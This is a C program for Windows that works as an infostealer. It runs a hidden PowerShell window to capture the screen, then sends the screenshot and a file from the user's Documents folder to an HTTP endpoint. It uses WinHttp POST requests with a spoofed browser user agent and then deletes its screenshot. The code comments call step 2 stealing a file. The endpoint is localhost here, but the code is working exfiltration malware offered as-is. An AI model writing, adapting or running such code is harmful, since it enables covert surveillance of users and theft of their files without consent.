#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>

void UploadFile(const char* filePath, const char* remoteName) {
    FILE *f = fopen(filePath, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *data = malloc(fsize);
    fread(data, 1, fsize, f);
    fclose(f);

    wchar_t wHost[] = L"127.0.0.1";
    wchar_t wPath[256];
    MultiByteToWideChar(CP_ACP, 0, remoteName, -1, wPath, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, wHost, 8080, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath, NULL, NULL, NULL, 0);
    
    wchar_t headers[256];
    swprintf(headers, 256, L"Content-Type: application/octet-stream\r\nContent-Length: %ld\r\n", fsize);
    
    WinHttpSendRequest(hRequest, headers, -1, (LPVOID)data, fsize, fsize, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    free(data);
}

int main() {
    char tempPath[MAX_PATH];
    sprintf(tempPath, "%s", getenv("TEMP"));
    char filePath[MAX_PATH];
    char docPath[MAX_PATH];

    // 1. Take Screenshot
    sprintf(filePath, "%s\\screenshot.png", tempPath);
    char cmd[512];
    sprintf(cmd, "powershell.exe -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save('%s')\"", filePath);
    system(cmd);
    UploadFile(filePath, "screenshot.png");

    // 2. Steal a file from Documents
    sprintf(docPath, "%s\\Documents\\secret.txt", getenv("USERPROFILE"));
    UploadFile(docPath, "secret.txt");

    // 3. Cleanup
    DeleteFile(filePath);

    return 0;
}
